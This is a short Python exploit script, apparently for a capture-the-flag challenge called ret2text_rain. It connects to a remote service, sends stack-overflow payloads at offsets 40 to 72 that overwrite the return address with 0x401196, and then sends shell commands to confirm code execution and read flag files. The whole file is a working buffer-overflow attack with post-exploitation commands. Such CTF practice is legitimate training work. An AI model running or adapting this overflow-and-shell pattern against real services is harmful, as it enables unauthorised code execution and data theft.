"""Probe ret2text_rain remote: try candidate offsets and observe socket behavior."""
import socket
import struct
import time

HOST, PORT = "noctf.fa1lsnow.com", 40537
WIN = 0x401196


def read_n(s, seconds=1.5):
    s.settimeout(0.5)
    end = time.time() + seconds
    out = b""
    while time.time() < end:
        try:
            d = s.recv(65536)
            if not d:
                return out + b"<EOF>"
            out += d
        except socket.timeout:
            continue
        except Exception as exc:  # noqa: BLE001
            return out + f"<ERR {exc}>".encode()
    return out


def try_offset(off: int) -> None:
    print(f"\n=== offset {off}")
    try:
        s = socket.create_connection((HOST, PORT), timeout=6)
    except Exception as exc:  # noqa: BLE001
        print("  connect failed:", exc)
        return
    print("  initial:", read_n(s, 1.2))
    payload = b"A" * off + struct.pack("<Q", WIN) + b"\n"
    try:
        s.sendall(payload)
        print("  sent", len(payload), "bytes")
    except Exception as exc:  # noqa: BLE001
        print("  send failed:", exc)
        s.close()
        return
    print("  after payload:", read_n(s, 1.5))
    try:
        s.sendall(b"echo PWNED_$(id -u)\n")
        print("  after echo:", read_n(s, 1.5))
    except Exception as exc:  # noqa: BLE001
        print("  post-send failed:", exc)
    try:
        s.sendall(b"cat /flag* flag* 2>/dev/null; echo MARK_END\n")
        print("  after cat:", read_n(s, 2.0))
    except Exception as exc:  # noqa: BLE001
        print("  cat failed:", exc)
    s.close()


if __name__ == "__main__":
    for off in (40, 48, 56, 72):
        try_offset(off)
